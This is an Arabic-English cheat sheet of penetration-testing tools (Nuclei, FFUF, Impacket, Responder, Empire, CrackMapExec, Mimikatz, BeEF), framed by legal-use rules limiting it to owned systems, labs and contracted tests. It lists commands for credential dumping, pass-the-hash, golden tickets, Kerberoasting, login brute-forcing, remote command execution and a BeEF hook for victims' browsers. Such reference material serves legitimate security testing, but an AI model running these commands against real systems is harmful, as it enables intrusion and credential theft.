# أدوات الاختبار الأمني المتقدمة — Advanced Security Testing

> ⛔ **قواعد السيادة — لا استثناء:**
> - `--privileged` → ممنوع منعاً باتاً
> - `--net=host` → ممنوع منعاً باتاً
> - دخول أنظمة غير مملوكة → جريمة
> - الذكاء لا يُنفّذ أي شيء هنا إلا بأمر صريح منك أنت

---

## Nuclei — فحص ثغرات بـ Templates

### المكتبة
- GitHub: `https://github.com/projectdiscovery/nuclei`
- Templates: `https://github.com/projectdiscovery/nuclei-templates`
- Docs: `https://docs.projectdiscovery.io/tools/nuclei`

```bash
# تحديث templates
nuclei -update-templates

# فحص موقع
nuclei -u https://example.com

# فحص بـ tags محددة
nuclei -u https://example.com -tags cve,sqli,xss

# فحص بـ severity
nuclei -u https://example.com -severity critical,high

# فحص قائمة مواقع
nuclei -l urls.txt -o results.txt

# بدون verification للـ SSL
nuclei -u https://example.com -no-verify

# rate limiting
nuclei -u https://example.com -rate-limit 10
```

### أهم فئات الـ Templates
```
cve/         → ثغرات CVE موثّقة
exposed/     → ملفات وصفحات مكشوفة
misconfigured/ → إعدادات خاطئة شائعة
technologies/ → كشف التقنيات المستخدمة
vulnerabilities/ → ثغرات عامة
```

---

## FFUF — Fuzzer سريع للويب

### المكتبة
- GitHub: `https://github.com/ffuf/ffuf`
- Docs: `https://github.com/ffuf/ffuf/wiki`

```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ

# Subdomain fuzzing
ffuf -w subdomains.txt -u https://FUZZ.example.com -H "Host: FUZZ.example.com"

# Parameter fuzzing
ffuf -w params.txt -u "https://example.com/page?FUZZ=test"

# POST data fuzzing
ffuf -w passwords.txt -u https://example.com/login \
  -X POST -d "user=admin&pass=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded"

# فلترة النتائج
ffuf -w wordlist.txt -u https://example.com/FUZZ \
  -fc 404,403 \        # إخفاء status codes
  -fs 0 \              # إخفاء حجم 0
  -fl 0                # إخفاء عدد سطور 0
```

---

## Amass — استطلاع Attack Surface

### المكتبة
- GitHub: `https://github.com/owasp-amass/amass`
- Docs: `https://github.com/owasp-amass/amass/wiki`

```bash
# enum subdomains
amass enum -d example.com

# passive only (بدون DNS brute)
amass enum -passive -d example.com

# مع Shodan API
amass enum -d example.com -src -active

# رسم خريطة البنية التحتية
amass viz -d3 -d example.com

# حفظ النتائج
amass enum -d example.com -o subdomains.txt
```

---

## Nessus / OpenVAS — فحص الثغرات

### Nessus Essentials (مجاني لـ 16 IP)
- تحميل: `https://www.tenable.com/products/nessus/nessus-essentials`
- بعد التثبيت: `https://localhost:8834`

### OpenVAS (مجاني وmتفتوح المصدر)
- GitHub: `https://github.com/greenbone/openvas-scanner`
- Docs: `https://greenbone.github.io/docs/`

```bash
# تشغيل OpenVAS بـ Docker
docker run -d \
  --name openvas \
  -p 443:443 \
  -p 9390:9390 \
  -v openvas_data:/data \
  mikesplain/openvas

# الواجهة على: https://localhost:443
# المستخدم: admin / كلمة السر: admin (تغييرها فوراً)
```

---

## Impacket — بروتوكولات Windows

### المكتبة
- GitHub: `https://github.com/fortra/impacket`
- Docs: `https://impacket.readthedocs.io`

```bash
# استعراض مشاركات SMB
python3 smbclient.py domain/user:password@target

# استخراج password hashes
python3 secretsdump.py domain/user:password@target

# تنفيذ أوامر عن بعد (مع صلاحيات)
python3 psexec.py domain/admin:password@target

# Kerberoasting (استخراج service tickets)
python3 GetUserSPNs.py domain/user:password -request
```

---

## Responder — LLMNR/NBT-NS Poisoning

### المكتبة
- GitHub: `https://github.com/lgandx/Responder`
- للاستخدام في بيئة اختبار معزولة فقط

```bash
# التشغيل على شبكة اختبار
python3 Responder.py -I eth0 -rdwv

# تحليل الـ hashes الملتقطة
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
```

---

## Empire / Covenant — Post-Exploitation Frameworks

### Empire
- GitHub: `https://github.com/BC-SECURITY/Empire`
- Docs: `https://bc-security.gitbook.io/empire-wiki`

### Covenant
- GitHub: `https://github.com/cobbr/Covenant`
- .NET-based C2 framework

```bash
# Empire
docker run -it --rm \
  --name empire \
  -p 1337:1337 \
  -p 5000:5000 \
  -v empire_data:/opt/Empire/empire/server/data \
  bcsecurity/empire:latest

# الواجهة: http://localhost:1337
```

---

## CrackMapExec — اختبار Active Directory

### المكتبة
- GitHub: `https://github.com/byt3bl33d3r/CrackMapExec`
- Wiki: `https://wiki.porchetta.industries`

```bash
# فحص SMB
crackmapexec smb 192.168.1.0/24

# اختبار credentials
crackmapexec smb 192.168.1.1 -u admin -p password

# قائمة shares
crackmapexec smb 192.168.1.1 -u admin -p password --shares

# تنفيذ أوامر
crackmapexec smb 192.168.1.1 -u admin -p password -x "whoami"

# استخراج secrets
crackmapexec smb 192.168.1.1 -u admin -p password --sam
```

---

## Mimikatz — استخراج Credentials (Windows)

### المكتبة
- GitHub: `https://github.com/gentilkiwi/mimikatz`
- Docs: `https://github.com/gentilkiwi/mimikatz/wiki`

```powershell
# من داخل Windows (Powershell كـ Administrator)
# استخراج passwords من الذاكرة
privilege::debug
sekurlsa::logonpasswords

# استخراج NTLM hashes
lsadump::sam

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe

# Golden Ticket
kerberos::golden /user:admin /domain:corp.local /sid:S-1-5- /krbtgt:HASH /id:500
```

---

## BeEF — Browser Exploitation Framework

### المكتبة
- GitHub: `https://github.com/beefproject/beef`
- Docs: `https://github.com/beefproject/beef/wiki`

```bash
# تشغيل BeEF
docker run -d \
  --name beef \
  -p 3000:3000 \
  -p 6789:6789 \
  -v beef_data:/beef \
  fcolista/beef

# الواجهة: http://localhost:3000/ui/panel
# hook.js للضحية: http://YOUR_IP:3000/hook.js
```

---

## ⚠️ قانون الاستخدام

```
كل أداة في هذا الملف:
✅ مشروعة للاستخدام على بيئاتك الخاصة
✅ مشروعة في بيئات المختبرات (CTF, HackTheBox, TryHackMe)
✅ مشروعة مع عقد اختبار اختراق موقّع
❌ غير مشروعة على أنظمة الآخرين بدون إذن
❌ ممنوع --privileged و--net=host في أي container
❌ الذكاء لا يشغّل أي أمر إلا بأمر صريح منك
```
